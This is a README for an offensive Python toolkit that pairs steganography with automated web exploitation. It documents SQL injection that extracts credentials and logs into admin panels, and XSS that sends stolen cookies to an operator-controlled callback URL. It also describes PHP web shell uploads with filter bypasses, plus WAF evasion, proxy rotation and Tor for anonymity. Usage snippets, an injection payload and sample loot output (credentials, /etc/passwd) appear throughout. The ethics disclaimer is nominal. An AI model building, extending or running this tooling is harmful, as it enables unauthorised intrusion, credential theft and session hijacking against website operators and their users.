# Ultra-Advanced Steganography and Cybersecurity Toolkit

## Overview

This script is an ultra-advanced toolkit designed for steganography, cybersecurity analysis, and penetration testing. It combines multiple functionalities into a single, highly automated tool that can handle image-based steganography, audio steganography, network scanning, data exfiltration, and more. The script is built with modularity, efficiency, and advanced techniques to bypass security measures like WAFs and ensure real-world applicability.

This tool is intended for **ethical use only** in controlled environments with explicit permission. Unauthorized use for malicious purposes is strictly prohibited and the responsibility lies solely with the user.

---

## Features

### 1. Steganography Capabilities
- **Image Steganography (LSB - Least Significant Bit):**
  - Hide messages or files inside images using LSB techniques.
  - Extract hidden messages or files from images.
  - Supports multiple image formats: PNG, JPEG, BMP.
  - Advanced obfuscation to evade detection by forensic tools.
- **Audio Steganography:**
  - Hide messages in WAV audio files using LSB or phase coding.
  - Extract hidden messages from audio files.
  - Adjustable bit-depth for balancing quality and capacity.
- **Text Steganography:**
  - Hide messages in text using invisible characters (zero-width spaces, joiners).
  - Extract hidden messages from text.

### 2. Data Exfiltration and Obfuscation
- **Custom Callback Server:**
  - Built-in HTTP server to receive exfiltrated data (e.g., cookies, OOB data).
  - No need for external services like Burp Collaborator or Interactsh.
- **DNS Exfiltration:**
  - Exfiltrate data via DNS queries to a controlled domain.
  - Supports encoding data in subdomains for stealthy exfiltration.
- **Obfuscation Techniques:**
  - Multiple encoding methods (Base64, URL encoding, hex, CharCode) to bypass WAFs.
  - Comment obfuscation, space obfuscation, and more for payloads.

### 3. Network and Vulnerability Scanning
- **Network Scanning:**
  - Scan for open ports using TCP SYN scanning.
  - Identify services running on ports (e.g., HTTP, SSH).
- **Vulnerability Detection:**
  - Detect common vulnerabilities in web applications (e.g., SQLi, XSS, RFU).
  - Supports multiple injection points: URL parameters, forms, cookies.
- **WAF Detection and Bypassing:**
  - Detects WAFs like Cloudflare, ModSecurity, Imperva, etc.
  - Uses advanced payload encoding to bypass WAFs.

### 4. Automated Exploitation
- **SQL Injection (SQLi):**
  - Supports all types: In-Band, UNION-Based, Time-Based, Boolean-Based, Error-Based, Second-Order, Out-of-Band.
  - Extracts database schema, tables, columns, and sensitive data (usernames, passwords, emails).
  - Finds and logs into admin panels automatically.
- **Cross-Site Scripting (XSS):**
  - Tests for Reflected, Stored, and DOM-Based XSS.
  - Exfiltrates cookies using a built-in callback server.
  - Uses advanced payloads to bypass filters and WAFs.
- **Remote File Upload (RFU):**
  - Uploads malicious PHP shells to the target server.
  - Bypasses upload restrictions using techniques like double extensions, null byte injection, and fake MIME types.
  - Executes commands on the server and extracts system information.

### 5. Proxy Support and Anonymity
- **Dynamic Proxy Pool:**
  - Fetches proxies from ProxyScrape API and tests them for reliability.
  - Rotates proxies for each request to avoid IP blocking.
- **Custom Headers:**
  - Mimics legitimate browser requests to avoid detection.
  - Randomizes User-Agent, Referer, and other headers.

### 6. Comprehensive Reporting
- Saves all results (extracted data, admin access, exfiltrated cookies, shell URLs, system info) to `exploited_data.txt`.
- Includes detailed suggestions for further exploitation using tools like Metasploit or BeEF.

---

## Requirements

To run this script, you need the following:

- **Python 3.8+**
- **Required Libraries:**
  - Install them using:
    ```bash
    pip install requests beautifulsoup4 dnspython pillow numpy scipy
    ```
  - `requests`: For making HTTP requests.
  - `beautifulsoup4`: For parsing HTML and extracting form data.
  - `dnspython`: For DNS exfiltration.
  - `pillow`: For image steganography.
  - `numpy` and `scipy`: For audio steganography.

- **Optional:**
  - Ensure your system has `port 8080` available for the callback server.
  - A stable internet connection for fetching proxies and making requests.

---

## Installation

1. **Clone or Download the Script:**
   - Save the script as `stego_cyber_toolkit.py` in your working directory.

2. **Set Up a Virtual Environment (Recommended):**
   ```bash
   python -m venv venv
   source venv/bin/activate  # Linux/Mac
   venv\Scripts\activate     # Windows
   ```

3. **Install Dependencies:**
   ```bash
   pip install requests beautifulsoup4 dnspython pillow numpy scipy
   ```

4. **Prepare Input Files:**
   - Create the following files in the same directory as the script:
     - `sqli_vulnerabilities.txt` (for SQLi targets)
     - `xss_vulnerabilities.txt` (for XSS targets)
     - `rfu_vulnerabilities.txt` (for RFU targets)
   - Format of each file:
     ```
     Vulnerable URL: http://example.com/search.php?q=<script>alert(1)</script>
     Type: Reflected XSS
     Details: ...
     --------------------------------------------------
     ```

---

## Parameters to Replace

The script includes several parameters that you may need to customize based on your setup. Below is a list of parameters you should replace:

### 1. **Proxy List**
- **Location:** Inside the `proxy_list` variable at the top of the script.
- **Default Value:**
  ```python
  proxy_list = [
      {"http": "http://103.174.102.223:80", "https": "https://103.174.102.223:80"},
      {"http": "http://38.54.71.81:80", "https": "https://38.54.71.81:80"},
      # ... (more proxies)
  ]
  ```
- **What to Replace:**
  - The default proxies may not work due to being outdated or blocked.
  - The script automatically fetches new proxies from ProxyScrape API, but you can replace this list with your own proxies for better reliability.
- **How to Replace:**
  - Obtain a list of working HTTP proxies from a reliable source (e.g., ProxyScrape, HideMyName).
  - Format them as a list of dictionaries:
    ```python
    proxy_list = [
        {"http": "http://your.proxy.ip:port", "https": "https://your.proxy.ip:port"},
        # Add more proxies
    ]
    ```

### 2. **Callback Server URL**
- **Location:** Inside the `exploit_out_of_band` and `exploit_xss` functions.
- **Default Value:**
  ```python
  callback_url = "http://localhost:8080/oob?data="  # For OOB SQLi
  callback_url = "http://localhost:8080/xss?cookie="  # For XSS
  ```
- **What to Replace:**
  - The default URL (`localhost:8080`) works if you're running the script locally.
  - If you're running the script on a remote server or need to receive callbacks on a different machine, replace `localhost` with your server's public IP or domain.
- **How to Replace:**
  - If your server IP is `192.168.1.100`, update the URLs:
    ```python
    callback_url = "http://192.168.1.100:8080/oob?data="
    callback_url = "http://192.168.1.100:8080/xss?cookie="
    ```
  - Ensure port `8080` is open and accessible on your server.

### 3. **DNS Exfiltration Domain (Optional)**
- **Location:** Inside the script if you extend it for DNS exfiltration (not enabled by default).
- **Default Value:** None (you need to add this feature manually if desired).
- **What to Replace:**
  - If you enable DNS exfiltration, you need a domain you control (e.g., `yourdomain.com`).
  - Set up a DNS server to log queries to this domain.
- **How to Replace:**
  - Add a domain in the script:
    ```python
    dns_domain = "yourdomain.com"
    ```
  - Configure your DNS server to log queries (e.g., using `bind` or a service like `dnslog.cn`).

### 4. **Custom Headers (Optional)**
- **Location:** Inside the `headers` dictionary.
- **Default Value:**
  ```python
  headers = {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.5",
      "Referer": "https://www.google.com/"
  }
  ```
- **What to Replace:**
  - You can customize the `User-Agent` or add more headers to mimic specific browsers or avoid detection.
- **How to Replace:**
  - Update the `headers` dictionary:
    ```python
    headers = {
        "User-Agent": "Your Custom User-Agent",
        "Accept": "text/html,*/*",
        "Custom-Header": "Custom-Value"
    }
    ```

---

## Usage

### 1. **Basic Usage**
- Run the script directly to perform automated exploitation on the targets listed in the input files:
  ```bash
  python stego_cyber_toolkit.py
  ```
- The script will:
  - Start a callback server on `localhost:8080`.
  - Read vulnerabilities from `sqli_vulnerabilities.txt`, `xss_vulnerabilities.txt`, and `rfu_vulnerabilities.txt`.
  - Exploit each target using multiple threads.
  - Save results to `exploited_data.txt`.

### 2. **Steganography Usage**
The script includes functions for steganography that you can use independently by calling them directly.

#### **Image Steganography**
- **Hide a Message in an Image:**
  ```python
  from stego_cyber_toolkit import hide_message_in_image

  image_path = "input.png"
  output_path = "output.png"
  message = "This is a secret message!"
  hide_message_in_image(image_path, message, output_path)
  ```
- **Extract a Message from an Image:**
  ```python
  from stego_cyber_toolkit import extract_message_from_image

  image_path = "output.png"
  message = extract_message_from_image(image_path)
  print("Extracted message:", message)
  ```

#### **Audio Steganography**
- **Hide a Message in an Audio File:**
  ```python
  from stego_cyber_toolkit import hide_message_in_audio

  audio_path = "input.wav"
  output_path = "output.wav"
  message = "This is a secret message!"
  hide_message_in_audio(audio_path, message, output_path)
  ```
- **Extract a Message from an Audio File:**
  ```python
  from stego_cyber_toolkit import extract_message_from_audio

  audio_path = "output.wav"
  message = extract_message_from_audio(audio_path)
  print("Extracted message:", message)
  ```

#### **Text Steganography**
- **Hide a Message in Text:**
  ```python
  from stego_cyber_toolkit import hide_message_in_text

  text = "Hello, World!"
  secret_message = "Secret"
  hidden_text = hide_message_in_text(text, secret_message)
  print("Text with hidden message:", hidden_text)
  ```
- **Extract a Message from Text:**
  ```python
  from stego_cyber_toolkit import extract_message_from_text

  hidden_text = "Hello, World!⁠⁠⁠"  # Contains invisible characters
  message = extract_message_from_text(hidden_text)
  print("Extracted message:", message)
  ```

### 3. **Custom Exploitation**
You can modify the script to target a specific URL or vulnerability type by calling the exploitation functions directly.

- **Exploit SQLi:**
  ```python
  from stego_cyber_toolkit import exploit_inband_union

  url = "http://example.com/products.php?id=1"
  proxy = {"http": "http://working.proxy:port", "https": "https://working.proxy:port"}
  extracted_data, admin_access, tables = exploit_inband_union(url, "In-Band SQLi", proxy)
  print("Extracted Data:", extracted_data)
  print("Admin Access:", admin_access)
  print("Tables:", tables)
  ```

- **Exploit XSS:**
  ```python
  from stego_cyber_toolkit import exploit_xss

  url = "http://example.com/search.php?q=test"
  proxy = {"http": "http://working.proxy:port", "https": "https://working.proxy:port"}
  cookies, admin_access = exploit_xss(url, "Reflected XSS", proxy)
  print("Exfiltrated Cookies:", cookies)
  print("Admin Access:", admin_access)
  ```

- **Exploit RFU:**
  ```python
  from stego_cyber_toolkit import exploit_rfu

  url = "http://example.com/upload.php"
  proxy = {"http": "http://working.proxy:port", "https": "https://working.proxy:port"}
  success, shell_url, system_info, admin_urls = exploit_rfu(url, "RFU", proxy)
  print("Upload Success:", success)
  print("Shell URL:", shell_url)
  print("System Info:", system_info)
  print("Admin URLs:", admin_urls)
  ```

---

## Output Format

The script saves all results to `exploited_data.txt`. The output format is as follows:

### **SQLi Results**
```
Exploited URL: http://example.com/products.php?id=' OR '1'='1
Vulnerability Type: In-Band SQLi
Extracted Data:
Table: users
Username: admin, Password: admin123
Admin Access:
Admin URL: http://example.com/admin, Username: admin, Password: admin123, Redirected To: http://example.com/admin/dashboard
Tables Found: users
Suggestion: For further exploitation (e.g., shell upload), use Metasploit with: msfconsole -x 'use exploit/multi/http/php_cgi_arg_injection'
--------------------------------------------------
```

### **XSS Results**
```
Exploited URL: http://example.com/search.php?q=<script>alert(1)</script>
Vulnerability Type: Reflected XSS
Exfiltrated Cookies:
session=abc123
Admin Access:
Admin URL: http://example.com/admin, Redirected To: http://example.com/admin/dashboard
Suggestion: Use the exfiltrated cookies to hijack sessions or use BeEF framework for advanced XSS exploitation.
--------------------------------------------------
```

### **RFU Results**
```
Exploited URL: http://example.com/upload.php
Vulnerability Type: RFU
File Upload Status:
Shell uploaded successfully at: http://example.com/uploads/shell_abc123.php
System Information:
cat /etc/passwd: root:x:0:0:root:/root:/bin/bash
whoami: www-data
uname -a: Linux server 5.4.0-42-generic
id: uid=33(www-data) gid=33(www-data)
Admin URLs Found:
http://example.com/admin
Suggestion: If shell uploaded, access it to execute commands or use Metasploit for further exploitation.
--------------------------------------------------
```

---

## Troubleshooting

### 1. **Proxies Not Working**
- **Issue:** The default proxies or fetched proxies are not working.
- **Solution:**
  - Replace the `proxy_list` with fresh proxies from a reliable source.
  - Disable proxy usage temporarily by commenting out the proxy-related code:
    ```python
    # proxy = random.choice(working_proxies)
    proxy = None
    ```

### 2. **Callback Server Not Receiving Data**
- **Issue:** The callback server on `localhost:8080` is not receiving data.
- **Solution:**
  - Ensure port `8080` is not blocked by your firewall.
  - Check if the target server can reach your machine (if not running locally, update the `callback_url` to your public IP).
  - Verify that the script has permission to bind to port `8080`.

### 3. **Steganography Errors**
- **Issue:** Errors when hiding/extracting messages in images or audio.
- **Solution:**
  - Ensure the input files (images, audio) are in the correct format (PNG/JPEG/BMP for images, WAV for audio).
  - Install missing dependencies (`pillow` for images, `numpy` and `scipy` for audio).

### 4. **WAF Blocking Requests**
- **Issue:** Requests are being blocked by a WAF.
- **Solution:**
  - The script automatically uses obfuscation to bypass WAFs, but you can add more encoding methods to `encode_payload` function.
  - Use more proxies and reduce the number of threads to avoid rate-limiting:
    ```python
    num_threads = 2  # Reduce from 5 to 2
    ```

---

## Advanced Customization

### 1. **Adding New Steganography Techniques**
- You can extend the steganography capabilities by adding new functions (e.g., video steganography).
- Example: Add a function for video steganography using a library like `opencv-python`.

### 2. **Enhancing Exploitation**
- Add more SQLi payloads for other databases (e.g., MSSQL, Oracle).
- Example: Add MSSQL-specific payloads in `extract_tables_columns`:
  ```python
  if db_type == "MSSQL":
      payload = f"' AND 1=0; SELECT name FROM sys.databases--"
  ```

### 3. **Improving Anonymity**
- Integrate Tor support for enhanced anonymity:
  - Install `requests[socks]`:
    ```bash
    pip install requests[socks]
    ```
  - Configure the script to use Tor:
    ```python
    proxy = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
    ```

---

## Disclaimer

This tool is provided for **educational and ethical testing purposes only**. The author is not responsible for any misuse or damage caused by this script. Always obtain explicit permission before testing any system or network.

---

## License

This project is licensed under the MIT License.

---
